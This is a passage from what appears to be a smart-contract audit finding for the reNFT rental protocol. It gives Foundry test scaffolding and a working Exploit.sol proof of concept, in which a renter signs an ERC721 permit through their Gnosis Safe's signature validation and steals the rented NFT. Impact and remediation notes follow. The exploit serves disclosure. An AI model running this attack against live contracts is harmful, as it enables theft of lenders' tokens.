storageMetadata.hooks.push(metadata.hooks[i]);\n            }\n        }\n\n        function _createRentalPayload(\n            RentPayload storage storagePayload,\n            RentPayload memory payload\n        ) private {\n            // set payload fulfillment on the order to fulfill\n            _createOrderFulfillment(storagePayload.fulfillment, payload.fulfillment);\n\n            // set payload metadata on the order to fulfill\n            _createOrderMetadata(storagePayload.metadata, payload.metadata);\n\n            // set payload expiration on the order to fulfill\n            storagePayload.expiration = payload.expiration;\n\n            // set payload intended fulfiller on the order to fulfill\n            storagePayload.intendedFulfiller = payload.intendedFulfiller;\n        }\n\n        function _createAdvancedOrder(\n            AdvancedOrder storage storageAdvancedOrder,\n            AdvancedOrder memory advancedOrder\n        ) private {\n            // create the order parameters on the order to fulfill\n            _createOrderParameters(storageAdvancedOrder.parameters, advancedOrder.parameters);\n\n            // create the rest of the static parameters on the order to fulfill\n            storageAdvancedOrder.numerator = advancedOrder.numerator;\n            storageAdvancedOrder.denominator = advancedOrder.denominator;\n            storageAdvancedOrder.signature = advancedOrder.signature;\n            storageAdvancedOrder.extraData = advancedOrder.extraData;\n        }\n\n        function _createOrderParameters(\n            OrderParameters storage storageOrderParameters,\n            OrderParameters memory orderParameters\n        ) private {\n            // create the static order parameters for the order to fulfill\n            storageOrderParameters.offerer = orderParameters.offerer;\n            storageOrderParameters.zone = orderParameters.zone;\n            storageOrderParameters.orderType = orderParameters.orderType;\n            storageOrderParameters.startTime = orderParameters.startTime;\n            storageOrderParameters.endTime = orderParameters.endTime;\n            storageOrderParameters.zoneHash = orderParameters.zoneHash;\n            storageOrderParameters.salt = orderParameters.salt;\n            storageOrderParameters.conduitKey = orderParameters.conduitKey;\n            storageOrderParameters.totalOriginalConsiderationItems = orderParameters\n                .totalOriginalConsiderationItems;\n\n            // create the dynamic order parameters for the order to fulfill\n            for (uint256 i = 0; i < orderParameters.offer.length; i++) {\n                storageOrderParameters.offer.push(orderParameters.offer[i]);\n            }\n            for (uint256 i = 0; i < orderParameters.consideration.length; i++) {\n                storageOrderParameters.consideration.push(orderParameters.consideration[i]);\n            }\n        }\n\n        function _createSeaportFulfillment(\n            Fulfillment storage storageFulfillment,\n            Fulfillment memory fulfillment\n        ) private {\n            // push the offer components to storage\n            for (uint256 i = 0; i < fulfillment.offerComponents.length; i++) {\n                storageFulfillment.offerComponents.push(fulfillment.offerComponents[i]);\n            }\n\n            // push the consideration components to storage\n            for (uint256 i = 0; i < fulfillment.considerationComponents.length; i++) {\n                storageFulfillment.considerationComponents.push(\n                    fulfillment.considerationComponents[i]\n                );\n            }\n        }\n\n        function _seaportItemTypeToRentalItemType(\n            SeaportItemType seaportItemType\n        ) internal pure returns (RentalItemType) {\n            if (seaportItemType == SeaportItemType.ERC20) {\n                return RentalItemType.ERC20;\n            } else if (seaportItemType == SeaportItemType.ERC721) {\n                return RentalItemType.ERC721;\n            } else if (seaportItemType == SeaportItemType.ERC1155) {\n                return RentalItemType.ERC1155;\n            } else {\n                revert(\"seaport item type not supported\");\n            }\n        }\n\n        function _createRentalOrder(\n            OrderToFulfill memory orderToFulfill\n        ) internal view returns (RentalOrder memory rentalOrder) {\n            // get the order parameters\n            OrderParameters memory parameters = orderToFulfill.advancedOrder.parameters;\n\n            // get the payload\n            RentPayload memory payload = orderToFulfill.payload;\n\n            // get the metadata\n            OrderMetadata memory metadata = payload.metadata;\n\n            // construct a rental order\n            rentalOrder = RentalOrder({\n                seaportOrderHash: orderToFulfill.orderHash,\n                items: new Item[](parameters.offer.length + parameters.consideration.length),\n                hooks: metadata.hooks,\n                orderType: metadata.orderType,\n                lender: parameters.offerer,\n                renter: payload.intendedFulfiller,\n                rentalWallet: payload.fulfillment.recipient,\n                startTimestamp: block.timestamp,\n                endTimestamp: block.timestamp + metadata.rentDuration\n            });\n\n            // for each new offer item being rented, create a new item struct to add to the rental order\n            for (uint256 i = 0; i < parameters.offer.length; i++) {\n                // PAYEE orders cannot have offer items\n                require(\n                    metadata.orderType != OrderType.PAYEE,\n                    \"TEST: cannot have offer items in PAYEE order\"\n                );\n\n                // get the offer item\n                OfferItem memory offerItem = parameters.offer[i];\n\n                // determine the item type\n                RentalItemType itemType = _seaportItemTypeToRentalItemType(offerItem.itemType);\n\n                // determine which entity the payment will settle to\n                SettleTo settleTo = offerItem.itemType == SeaportItemType.ERC20\n                    ? SettleTo.RENTER\n                    : SettleTo.LENDER;\n\n                // create a new rental item\n                rentalOrder.items[i] = Item({\n                    itemType: itemType,\n                    settleTo: settleTo,\n                    token: offerItem.token,\n                    amount: offerItem.startAmount,\n                    identifier: offerItem.identifierOrCriteria\n                });\n            }\n\n            // for each consideration item in return, create a new item struct to add to the rental order\n            for (uint256 i = 0; i < parameters.consideration.length; i++) {\n                // PAY orders cannot have consideration items\n                require(\n                    metadata.orderType != OrderType.PAY,\n                    \"TEST: cannot have consideration items in PAY order\"\n                );\n\n                // get the offer item\n                ConsiderationItem memory considerationItem = parameters.consideration[i];\n\n                // determine the item type\n                RentalItemType itemType = _seaportItemTypeToRentalItemType(\n                    considerationItem.itemType\n                );\n\n                // determine which entity the payment will settle to\n                SettleTo settleTo = metadata.orderType == OrderType.PAYEE &&\n                    considerationItem.itemType == SeaportItemType.ERC20\n                    ? SettleTo.RENTER\n                    : SettleTo.LENDER;\n\n                // calculate item index offset\n                uint256 itemIndex = i + parameters.offer.length;\n\n                // create a new payment item\n                rentalOrder.items[itemIndex] = Item({\n                    itemType: itemType,\n                    settleTo: settleTo,\n                    token: considerationItem.token,\n                    amount: considerationItem.startAmount,\n                    identifier: considerationItem.identifierOrCriteria\n                });\n            }\n        }\n\n        function _signProtocolOrder(\n            uint256 signerPrivateKey,\n            bytes32 payloadHash\n        ) internal view returns (bytes memory signature) {\n            // fetch domain separator from create policy\n            bytes32 domainSeparator = create.domainSeparator();\n\n            // sign the EIP-712 digest\n            (uint8 v, bytes32 r, bytes32 s) = vm.sign(\n                signerPrivateKey,\n                domainSeparator.toTypedDataHash(payloadHash)\n            );\n\n            // encode the signature\n            signature = abi.encodePacked(r, s, v);\n        }\n\n        /////////////////////////////////////////////////////////////////////////////////\n        //                            Fulfillment Amendments                           //\n        /////////////////////////////////////////////////////////////////////////////////\n\n        function withFulfiller(ProtocolAccount memory _fulfiller) internal {\n            fulfiller = _fulfiller;\n        }\n\n        function withRecipient(address _recipient) internal {\n            seaportRecipient = _recipient;\n        }\n\n        function withAdvancedOrder(\n            AdvancedOrder memory _advancedOrder,\n            uint256 orderIndex\n        ) internal {\n            // get a storage pointer to the order to fulfill\n            OrderToFulfill storage orderToFulfill = ordersToFulfill[orderIndex];\n\n            // set the new advanced order\n            _createAdvancedOrder(orderToFulfill.advancedOrder, _advancedOrder);\n        }\n\n        function withSeaportMatchOrderFulfillment(Fulfillment memory _fulfillment) internal {\n            // get a pointer to a new seaport fulfillment\n            Fulfillment storage fulfillment = seaportMatchOrderFulfillments.push();\n\n            // set the fulfillment\n            _createSeaportFulfillment(\n                fulfillment,\n                Fulfillment({\n                    offerComponents: _fulfillment.offerComponents,\n                    considerationComponents: _fulfillment.considerationComponents\n                })\n            );\n        }\n\n        function withSeaportMatchOrderFulfillments(\n            Fulfillment[] memory fulfillments\n        ) internal {\n            // reset all current seaport match order fulfillments\n            resetSeaportMatchOrderFulfillments();\n\n            // add the new offer items to storage\n            for (uint256 i = 0; i < fulfillments.length; i++) {\n                // get a pointer to a new seaport fulfillment\n                Fulfillment storage fulfillment = seaportMatchOrderFulfillments.push();\n\n                // set the fulfillment\n                _createSeaportFulfillment(\n                    fulfillment,\n                    Fulfillment({\n                        offerComponents: fulfillments[i].offerComponents,\n                        considerationComponents: fulfillments[i].considerationComponents\n                    })\n                );\n            }\n        }\n\n        function withBaseOrderFulfillmentComponents() internal {\n            // create offer fulfillments. We need to specify which offer items can be aggregated\n            // into one transaction. For example, 2 different orders where the same seller is offering\n            // the same item in each.\n            //\n            // Since BASE orders will only contain ERC721 offer items, these cannot be aggregated. So, a separate fulfillment\n            // is created for each order.\n            for (uint256 i = 0; i < ordersToFulfill.length; i++) {\n                // get a pointer to a new offer fulfillment array. This array will contain indexes of\n                // orders and items which are all grouped on whether they can be combined in a single transferFrom()\n                FulfillmentComponent[] storage offerFulfillments = seaportOfferFulfillments\n                    .push();\n\n                // number of offer items in the order\n                uint256 offerItemsInOrder = ordersToFulfill[i]\n                    .advancedOrder\n                    .parameters\n                    .offer\n                    .length;\n\n                // add a single fulfillment component for each offer item in the order\n                for (uint256 j = 0; j < offerItemsInOrder; j++) {\n                    offerFulfillments.push(\n                        FulfillmentComponent({orderIndex: i, itemIndex: j})\n                    );\n                }\n            }\n\n            // create consideration fulfillments. We need to specify which consideration items can be aggregated\n            // into one transaction. For example, 3 different orders where the same fungible consideration items are\n            // expected in return.\n            //\n            // get a pointer to a new offer fulfillment array. This array will contain indexes of\n            // orders and items which are all grouped on whether they can be combined in a single transferFrom()\n            FulfillmentComponent[]\n                storage considerationFulfillments = seaportConsiderationFulfillments.push();\n\n            // BASE orders will only contain ERC20 items, these are fungible and are candidates for aggregation. Because\n            // all of these BASE orders will be fulfilled by the same EOA, and all ERC20 consideration items are going to the\n            // ESCRW contract, the consideration items can be aggregated. In other words, Seaport will only make a single transfer\n            // of ERC20 tokens from the fulfiller EOA to the payment escrow contract.\n            //\n            // put all fulfillments into one which can be an aggregated transfer\n            for (uint256 i = 0; i < ordersToFulfill.length; i++) {\n                considerationFulfillments.push(\n                    FulfillmentComponent({orderIndex: i, itemIndex: 0})\n                );\n            }\n        }\n\n        function withLinkedPayAndPayeeOrders(\n            uint256 payOrderIndex,\n            uint256 payeeOrderIndex\n        ) internal {\n            // get the PAYEE order\n            OrderParameters memory payeeOrder = ordersToFulfill[payeeOrderIndex]\n                .advancedOrder\n                .parameters;\n\n            // For each consideration item in the PAYEE order, a fulfillment should be\n            // constructed with a corresponding item from the PAY order's offer items.\n            for (uint256 i = 0; i < payeeOrder.consideration.length; ++i) {\n                // define the offer components\n                FulfillmentComponent[] memory offerComponents = new FulfillmentComponent[](1);\n                offerComponents[0] = FulfillmentComponent({\n                    orderIndex: payOrderIndex,\n                    itemIndex: i\n                });\n\n                // define the consideration components\n                FulfillmentComponent[]\n                    memory considerationComponents = new FulfillmentComponent[](1);\n                considerationComponents[0] = FulfillmentComponent({\n                    orderIndex: payeeOrderIndex,\n                    itemIndex: i\n                });\n\n                // get a pointer to a new seaport fulfillment\n                Fulfillment storage fulfillment = seaportMatchOrderFulfillments.push();\n\n                // set the fulfillment\n                _createSeaportFulfillment(\n                    fulfillment,\n                    Fulfillment({\n                        offerComponents: offerComponents,\n                        considerationComponents: considerationComponents\n                    })\n                );\n            }\n        }\n\n        function resetFulfiller() internal {\n            delete fulfiller;\n        }\n\n        function resetOrdersToFulfill() internal {\n            delete ordersToFulfill;\n        }\n\n        function resetSeaportMatchOrderFulfillments() internal {\n            delete seaportMatchOrderFulfillments;\n        }\n\n        /////////////////////////////////////////////////////////////////////////////////\n        //                           Fulfillment Finalization                          //\n        /////////////////////////////////////////////////////////////////////////////////\n\n        function _finalizePayOrderFulfillment(\n            bytes memory expectedError\n        )\n            private\n            returns (RentalOrder memory payRentalOrder, RentalOrder memory payeeRentalOrder)\n        {\n            // get the orders to fulfill\n            OrderToFulfill memory payOrder = ordersToFulfill[0];\n            OrderToFulfill memory payeeOrder = ordersToFulfill[1];\n\n            // create rental orders\n            payRentalOrder = _createRentalOrder(payOrder);\n            payeeRentalOrder = _createRentalOrder(payeeOrder);\n\n            // expect an error if error data was provided\n            if (expectedError.length != 0) {\n                vm.expectRevert(expectedError);\n            }\n            // otherwise, expect the relevant event to be emitted.\n            else {\n                vm.expectEmit({emitter: address(create)});\n                emit Events.RentalOrderStarted(\n                    create.getRentalOrderHash(payRentalOrder),\n                    payOrder.payload.metadata.emittedExtraData,\n                    payRentalOrder.seaportOrderHash,\n                    payRentalOrder.items,\n                    payRentalOrder.hooks,\n                    payRentalOrder.orderType,\n                    payRentalOrder.lender,\n                    payRentalOrder.renter,\n                    payRentalOrder.rentalWallet,\n                    payRentalOrder.startTimestamp,\n                    payRentalOrder.endTimestamp\n                );\n            }\n\n            // the offerer of the PAYEE order fulfills the orders.\n            vm.prank(fulfiller.addr);\n\n            // fulfill the orders\n            seaport.matchAdvancedOrders(\n                _deconstructOrdersToFulfill(),\n                new CriteriaResolver[](0),\n                seaportMatchOrderFulfillments,\n                seaportRecipient\n            );\n\n            // clear structs\n            resetFulfiller();\n            resetOrdersToFulfill();\n            resetSeaportMatchOrderFulfillments();\n        }\n\n        function finalizePayOrderFulfillment()\n            internal\n            returns (RentalOrder memory payRentalOrder, RentalOrder memory payeeRentalOrder)\n        {\n            (payRentalOrder, payeeRentalOrder) = _finalizePayOrderFulfillment(bytes(\"\"));\n        }\n\n        function finalizePayOrderFulfillmentWithError(\n            bytes memory expectedError\n        )\n            internal\n            returns (RentalOrder memory payRentalOrder, RentalOrder memory payeeRentalOrder)\n        {\n            (payRentalOrder, payeeRentalOrder) = _finalizePayOrderFulfillment(expectedError);\n        }\n\n        function _finalizeBaseOrderFulfillment(\n            bytes memory expectedError\n        ) private returns (RentalOrder memory rentalOrder) {\n            // get the order to fulfill\n            OrderToFulfill memory baseOrder = ordersToFulfill[0];\n\n            // create a rental order\n            rentalOrder = _createRentalOrder(baseOrder);\n\n            // expect an error if error data was provided\n            if (expectedError.length != 0) {\n                vm.expectRevert(expectedError);\n            }\n            // otherwise, expect the relevant event to be emitted.\n            else {\n                vm.expectEmit({emitter: address(create)});\n                emit Events.RentalOrderStarted(\n                    create.getRentalOrderHash(rentalOrder),\n                    baseOrder.payload.metadata.emittedExtraData,\n                    rentalOrder.seaportOrderHash,\n                    rentalOrder.items,\n                    rentalOrder.hooks,\n                    rentalOrder.orderType,\n                    rentalOrder.lender,\n                    rentalOrder.renter,\n                    rentalOrder.rentalWallet,\n                    rentalOrder.startTimestamp,\n                    rentalOrder.endTimestamp\n                );\n            }\n\n            // the owner of the rental wallet fulfills the advanced order, and marks the rental wallet\n            // as the recipient\n            vm.prank(fulfiller.addr);\n            seaport.fulfillAdvancedOrder(\n                baseOrder.advancedOrder,\n                new CriteriaResolver[](0),\n                conduitKey,\n                seaportRecipient\n            );\n\n            // clear structs\n            resetFulfiller();\n            resetOrdersToFulfill();\n            resetSeaportMatchOrderFulfillments();\n        }\n\n        function finalizeBaseOrderFulfillment()\n            internal\n            returns (RentalOrder memory rentalOrder)\n        {\n            rentalOrder = _finalizeBaseOrderFulfillment(bytes(\"\"));\n        }\n\n        function finalizeBaseOrderFulfillmentWithError(\n            bytes memory expectedError\n        ) internal returns (RentalOrder memory rentalOrder) {\n            rentalOrder = _finalizeBaseOrderFulfillment(expectedError);\n        }\n\n        function finalizeBaseOrdersFulfillment()\n            internal\n            returns (RentalOrder[] memory rentalOrders)\n        {\n            // Instantiate rental orders\n            uint256 numOrdersToFulfill = ordersToFulfill.length;\n            rentalOrders = new RentalOrder[](numOrdersToFulfill);\n\n            // convert each order to fulfill into a rental order\n            for (uint256 i = 0; i < numOrdersToFulfill; i++) {\n                rentalOrders[i] = _createRentalOrder(ordersToFulfill[i]);\n            }\n\n            // Expect the relevant events to be emitted.\n            for (uint256 i = 0; i < rentalOrders.length; i++) {\n                vm.expectEmit({emitter: address(create)});\n                emit Events.RentalOrderStarted(\n                    create.getRentalOrderHash(rentalOrders[i]),\n                    ordersToFulfill[i].payload.metadata.emittedExtraData,\n                    rentalOrders[i].seaportOrderHash,\n                    rentalOrders[i].items,\n                    rentalOrders[i].hooks,\n                    rentalOrders[i].orderType,\n                    rentalOrders[i].lender,\n                    rentalOrders[i].renter,\n                    rentalOrders[i].rentalWallet,\n                    rentalOrders[i].startTimestamp,\n                    rentalOrders[i].endTimestamp\n                );\n            }\n\n            // the owner of the rental wallet fulfills the advanced orders, and marks the rental wallet\n            // as the recipient\n            vm.prank(fulfiller.addr);\n            seaport.fulfillAvailableAdvancedOrders(\n                _deconstructOrdersToFulfill(),\n                new CriteriaResolver[](0),\n                seaportOfferFulfillments,\n                seaportConsiderationFulfillments,\n                conduitKey,\n                seaportRecipient,\n                ordersToFulfill.length\n            );\n\n            // clear structs\n            resetFulfiller();\n            resetOrdersToFulfill();\n            resetSeaportMatchOrderFulfillments();\n        }\n\n        function finalizePayOrdersFulfillment()\n            internal\n            returns (RentalOrder[] memory rentalOrders)\n        {\n            // Instantiate rental orders\n            uint256 numOrdersToFulfill = ordersToFulfill.length;\n            rentalOrders = new RentalOrder[](numOrdersToFulfill);\n\n            // convert each order to fulfill into a rental order\n            for (uint256 i = 0; i < numOrdersToFulfill; i++) {\n                rentalOrders[i] = _createRentalOrder(ordersToFulfill[i]);\n            }\n\n            // Expect the relevant events to be emitted.\n            for (uint256 i = 0; i < rentalOrders.length; i++) {\n                // only expect the event if its a PAY order\n                if (ordersToFulfill[i].payload.metadata.orderType == OrderType.PAY) {\n                    vm.expectEmit({emitter: address(create)});\n                    emit Events.RentalOrderStarted(\n                        create.getRentalOrderHash(rentalOrders[i]),\n                        ordersToFulfill[i].payload.metadata.emittedExtraData,\n                        rentalOrders[i].seaportOrderHash,\n                        rentalOrders[i].items,\n                        rentalOrders[i].hooks,\n                        rentalOrders[i].orderType,\n                        rentalOrders[i].lender,\n                        rentalOrders[i].renter,\n                        rentalOrders[i].rentalWallet,\n                        rentalOrders[i].startTimestamp,\n                        rentalOrders[i].endTimestamp\n                    );\n                }\n            }\n\n            // the offerer of the PAYEE order fulfills the orders. For this order, it shouldn't matter\n            // what the recipient address is\n            vm.prank(fulfiller.addr);\n            seaport.matchAdvancedOrders(\n                _deconstructOrdersToFulfill(),\n                new CriteriaResolver[](0),\n                seaportMatchOrderFulfillments,\n                seaportRecipient\n            );\n\n            // clear structs\n            resetFulfiller();\n            resetOrdersToFulfill();\n            resetSeaportMatchOrderFulfillments();\n        }\n\n        function _deconstructOrdersToFulfill()\n            private\n            view\n            returns (AdvancedOrder[] memory advancedOrders)\n        {\n            // get the length of the orders to fulfill\n            advancedOrders = new AdvancedOrder[](ordersToFulfill.length);\n\n            // build up the advanced orders\n            for (uint256 i = 0; i < ordersToFulfill.length; i++) {\n                advancedOrders[i] = ordersToFulfill[i].advancedOrder;\n            }\n        }\n    }\n\n    contract SetupReNFT is OrderFulfiller {}\n\n</details>\n\n<details>\n<summary><b>Exploit.sol</b></summary>\n<br>\n\n    // SPDX-License-Identifier: BUSL-1.1\n    pragma solidity ^0.8.20;\n\n    import {\n        Order,\n        FulfillmentComponent,\n        Fulfillment,\n        ItemType as SeaportItemType,\n        OfferItem,\n        ItemType\n    } from \"@seaport-types/lib/ConsiderationStructs.sol\";\n\n    import {OfferItemLib} from \"@seaport-sol/SeaportSol.sol\";\n\n    import {OrderType, OrderMetadata, RentalOrder} from \"@src/libraries/RentalStructs.sol\";\n\n    import {ERC721} from '@openzeppelin-contracts/token/ERC721/ERC721.sol';\n    import {IERC721} from '@openzeppelin-contracts/token/ERC721/IERC721.sol';\n    import {Ownable} from \"@openzeppelin-contracts/access/Ownable.sol\";\n\n    import {SetupReNFT} from \"./SetupExploit.sol\";\n    import {Assertions} from \"@test/utils/Assertions.sol\";\n    import {Constants} from \"@test/utils/Constants.sol\";\n    import {SafeUtils} from \"@test/utils/GnosisSafeUtils.sol\";\n    import {Enum} from \"@safe-contracts/common/Enum.sol\";\n\n    import \"forge-std/console.sol\";\n\n\n\n    contract Exploit is SetupReNFT, Assertions, Constants {\n\n        using OfferItemLib for OfferItem;\n\n        function test_NFT_Permit_Exploit() public {\n\n            NFTWithPermit permitNFT = new NFTWithPermit();\n\n            // The NFT token which Alice, the lender, will offer.\n            permitNFT.safeMint(alice.addr, 1);\n\n            // Approve seaport conduit to spend the token.\n            vm.prank(alice.addr);\n            permitNFT.approve(address(conduit), 1);\n\n            /////////////////////////////////////////////\n            // Order Creation & Fulfillment simulation //\n            /////////////////////////////////////////////\n\n            // Alice creates a BASE order\n            createOrder({\n                offerer: alice,\n                orderType: OrderType.BASE,\n                erc721Offers: 1,\n                erc1155Offers: 0,\n                erc20Offers: 0,\n                erc721Considerations: 0,\n                erc1155Considerations: 0,\n                erc20Considerations: 1\n            });\n\n            // Remove the pre-inserted offer item (which is inserted by the tests)\n            popOfferItem();\n\n            // Set the NFT which we created as the offer item\n            withOfferItem(\n                    OfferItemLib\n                        .empty()\n                        .withItemType(ItemType.ERC721)\n                        .withToken(address(permitNFT))\n                        .withIdentifierOrCriteria(1)\n                        .withStartAmount(1)\n                        .withEndAmount(1)\n            );\n\n            // Finalize the order creation\n            (\n                Order memory order,\n                bytes32 orderHash,\n                OrderMetadata memory metadata\n            ) = finalizeOrder();\n            \n\n            // Create an order fulfillment\n            createOrderFulfillment({\n                _fulfiller: attacker,\n                order: order,\n                orderHash: orderHash,\n                metadata: metadata\n            });\n\n            // Finalize the base order fulfillment\n            RentalOrder memory rentalOrder = finalizeBaseOrderFulfillment();\n\n            // get the rental order hash\n            bytes32 rentalOrderHash = create.getRentalOrderHash(rentalOrder);\n\n            // assert that the rental order was stored\n            assertEq(STORE.orders(rentalOrderHash), true);\n\n            // assert that the token is in storage\n            assertEq(STORE.isRentedOut(address(attacker.safe), address(permitNFT), 1), true);\n\n            // assert that the ERC1155 is in the rental wallet of the fulfiller\n            assertEq(permitNFT.balanceOf(address(attacker.safe)), 1);\n\n\n            /** ------------------- Exploitation ------------------- */\n\n            // Impersonate the attacker\n            vm.startPrank(attacker.addr);\n\n            // The digest which will be hashed by gnosis then signed by the attacker (owner of the safe).\n            // The format of this digest is taken from the `permit()` function.\n            bytes memory digest = bytes.concat(\n                keccak256(\n                    abi.encodePacked(\n                        '\\x19\\x01',\n                        permitNFT.DOMAIN_SEPARATOR(),\n                        keccak256(\n                            abi.encode(\n                                permitNFT.PERMIT_TYPEHASH(), \n                                attacker.addr, // spender\n                                1, // the token Id\n                                permitNFT.tokenIdNonces(1), // get the nonce for the token ID \"1\"\n                                block.timestamp + 10000000 // deadline until which, the call to `permit()` with this signature will be allowed.\n                            )\n                        )\n                    )\n                )\n            );        \n            \n            // Get the message hash for the digest.\n            bytes32 msgHash = fallbackHandler.getMessageHashForSafe(attacker.safe, digest);\n\n            // Sign the hashed message and get the signature (r, s, v).\n            (uint8 v, bytes32 r, bytes32 s) = vm.sign(attacker.privateKey, msgHash);\n\n\n            // The call to `permit()` -> (address spender, uint256 tokenId, uint256 deadline, v, r, s)\n            bytes memory transaction = abi.encodeWithSelector(\n                ERC721Permit.permit.selector,\n                attacker.addr, // The address of the attacker\n                1, // The token ID to hijack\n                block.timestamp + 10000000, // the deadline\n                v,\n                r,\n                s\n            );\n\n            // Sign the transaction to be sent to gnosis\n            bytes memory transactionSignature = SafeUtils.signTransaction(\n                address(attacker.safe),\n                attacker.privateKey,\n                address(permitNFT),\n                transaction\n            );\n\n\n            // Execute the transaction\n            SafeUtils.executeTransaction(\n                address(attacker.safe),\n                address(permitNFT),\n                transaction,\n                transactionSignature\n            );\n\n            // Transfer the NFT from the attacker's safe to the attacker's address. This is the final stage of the exploit\n            permitNFT.transferFrom(address(attacker.safe), address(attacker.addr), 1);\n\n            vm.stopPrank();\n\n            /** -------------- Final checks -------------- */\n\n            uint256 attackersBalance = permitNFT.balanceOf(address(attacker.addr));\n            uint256 attackersSafeBalance = permitNFT.balanceOf(address(attacker.safe));\n\n            if (attackersSafeBalance == 0 && attackersBalance == 1) {\n                console.log(\"Tokens successfully hijacked from the attacker's (borrower) safe!\");\n            }\n\n        }\n\n    }\n\n\n\n\n\n    // Serves as a replacement for openzeppelin's `isContract` function which `ERC721Permit` relies on, simply because the currently installed openzeppelin version (5.0) for this PoC setup no longer includes the function `isContract` in the `Address` library.\n    library Address {\n        function isContract(address account) internal view returns (bool) {\n            // This method relies on extcodesize, which returns 0 for contracts in\n            // construction, since the code is only stored at the end of the\n            // constructor execution.\n\n            uint256 size;\n            assembly {\n                size := extcodesize(account)\n            }\n            return size > 0;\n        }\n    }\n\n    // Source: https://github.com/Uniswap/v3-periphery/blob/main/contracts/libraries/ChainId.sol\n    /// @title Function for getting the current chain ID\n    library ChainId {\n        /// @dev Gets the current chain ID\n        /// @return chainId The current chain ID\n        function get() internal view returns (uint256 chainId) {\n            assembly {\n                chainId := chainid()\n            }\n        }\n    }\n\n    // Source: https://github.com/Uniswap/v3-periphery/blob/main/contracts/interfaces/external/IERC1271.sol\n    /// @title Interface for verifying contract-based account signatures\n    /// @notice Interface that verifies provided signature for the data\n    /// @dev Interface defined by EIP-1271\n    interface IERC1271 {\n        /// @notice Returns whether the provided signature is valid for the provided data\n        /// @dev MUST return the bytes4 magic value 0x1626ba7e when function passes.\n        /// MUST NOT modify state (using STATICCALL for solc < 0.5, view modifier for solc > 0.5).\n        /// MUST allow external calls.\n        /// @param hash Hash of the data to be signed\n        /// @param signature Signature byte array associated with _data\n        /// @return magicValue The bytes4 magic value 0x1626ba7e\n        function isValidSignature(bytes32 hash, bytes memory signature) external view returns (bytes4 magicValue);\n    }\n\n    /// @title ERC721 with permit\n    /// @notice Extension to ERC721 that includes a permit function for signature based approvals\n    interface IERC721Permit is IERC721 {\n        /// @notice The permit typehash used in the permit signature\n        /// @return The typehash for the permit\n        function PERMIT_TYPEHASH() external pure returns (bytes32);\n\n        /// @notice The domain separator used in the permit signature\n        /// @return The domain seperator used in encoding of permit signature\n        function DOMAIN_SEPARATOR() external view returns (bytes32);\n\n        /// @notice Approve of a specific token ID for spending by spender via signature\n        /// @param spender The account that is being approved\n        /// @param tokenId The ID of the token that is being approved for spending\n        /// @param deadline The deadline timestamp by which the call must be mined for the approve to work\n        /// @param v Must produce valid secp256k1 signature from the holder along with `r` and `s`\n        /// @param r Must produce valid secp256k1 signature from the holder along with `v` and `s`\n        /// @param s Must produce valid secp256k1 signature from the holder along with `r` and `v`\n        function permit(\n            address spender,\n            uint256 tokenId,\n            uint256 deadline,\n            uint8 v,\n            bytes32 r,\n            bytes32 s\n        ) external payable;\n    }\n\n    // Source: https://github.com/Uniswap/v3-periphery/blob/main/contracts/base/ERC721Permit.sol\n    /// @title ERC721 with permit\n    /// @notice Nonfungible tokens that support an approve via signature, i.e. permit\n    abstract contract ERC721Permit is ERC721, IERC721Permit {\n        /// @dev Gets the current nonce for a token ID and then increments it, returning the original value\n        function _getAndIncrementNonce(uint256 tokenId) internal virtual returns (uint256);\n\n        /// @dev The hash of the name used in the permit signature verification\n        bytes32 private immutable nameHash;\n\n        /// @dev The hash of the version string used in the permit signature verification\n        bytes32 private immutable versionHash;\n\n        /// @notice Computes the nameHash and versionHash\n        constructor(\n            string memory name_,\n            string memory symbol_,\n            string memory version_\n        ) ERC721(name_, symbol_) {\n            nameHash = keccak256(bytes(name_));\n            versionHash = keccak256(bytes(version_));\n        }\n\n        /// @inheritdoc IERC721Permit\n        function DOMAIN_SEPARATOR() public view override returns (bytes32) {\n            return\n                keccak256(\n                    abi.encode(\n                        // keccak256('EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)')\n                        0x8b73c3c69bb8fe3d512ecc4cf759cc79239f7b179b0ffacaa9a75d522b39400f,\n                        nameHash,\n                        versionHash,\n                        ChainId.get(),\n                        address(this)\n                    )\n                );\n        }\n\n        /// @inheritdoc IERC721Permit\n        /// @dev Value is equal to keccak256(\"Permit(address spender,uint256 tokenId,uint256 nonce,uint256 deadline)\");\n        bytes32 public constant override PERMIT_TYPEHASH =\n            0x49ecf333e5b8c95c40fdafc95c1ad136e8914a8fb55e9dc8bb01eaa83a2df9ad;\n\n        /// @inheritdoc IERC721Permit\n        function permit(\n            address spender,\n            uint256 tokenId,\n            uint256 deadline,\n            uint8 v,\n            bytes32 r,\n            bytes32 s\n        ) external payable override {\n            require(block.timestamp <= deadline, 'Permit expired');\n\n            bytes32 digest =\n                keccak256(\n                    abi.encodePacked(\n                        '\\x19\\x01',\n                        DOMAIN_SEPARATOR(),\n                        keccak256(abi.encode(PERMIT_TYPEHASH, spender, tokenId, _getAndIncrementNonce(tokenId), deadline))\n                    )\n                );\n            address owner = ownerOf(tokenId);\n            require(spender != owner, 'ERC721Permit: approval to current owner');\n\n            if (Address.isContract(owner)) {\n                require(IERC1271(owner).isValidSignature(digest, abi.encodePacked(r, s, v)) == 0x1626ba7e, 'Unauthorized');\n            } else {\n                address recoveredAddress = ecrecover(digest, v, r, s);\n                require(recoveredAddress != address(0), 'Invalid signature');\n                require(recoveredAddress == owner, 'Unauthorized');\n            }\n\n            _approve(spender, tokenId);\n        }\n    }\n\n\n    contract NFTWithPermit is ERC721, ERC721Permit, Ownable {\n        \n        mapping(uint256 tokenId => uint256 nonce) public tokenIdNonces;\n\n        constructor() ERC721Permit(\"MyNFT\", \"MNFT\", \"1.1\") Ownable(msg.sender) {}\n\n        function _getAndIncrementNonce(uint256 tokenId) internal override returns (uint256) {\n\n            uint256 tokenIdNonce = tokenIdNonces[tokenId];\n\n            tokenIdNonces[tokenId] += 1;\n\n            return tokenIdNonce;\n        }\n\n        function safeMint(address to, uint256 tokenId) public onlyOwner {\n            _safeMint(to, tokenId);\n        }\n\n    }\n\n</details>\n\n***\n\n### Impact\n\n***\n\nThis allows an attacker to hijack any NFT implementing the `permit()` function.\n\n***\n\n### Remediation\n\n***\n\nOne way to remediate this is to add a check in the [`FallbackManager.sol`](https://github.com/safe-global/safe-contracts/blob/main/contracts/base/FallbackManager.sol) contract in the gnosis safe contracts. This check should check if the function selector is equivalent to `isValidSignature(bytes32,bytes)` and the `msg.sender` is an address of a NFT token that is rented in the reNFT protocol.\n\n**[Alec1017 (reNFT) commented](https://github.com/code-423n4/2024-01-renft-findings/issues/587#issuecomment-1910740999):**\n > Non-standard ERC implementations were considered out of scope, but regardless we do plan on adding a 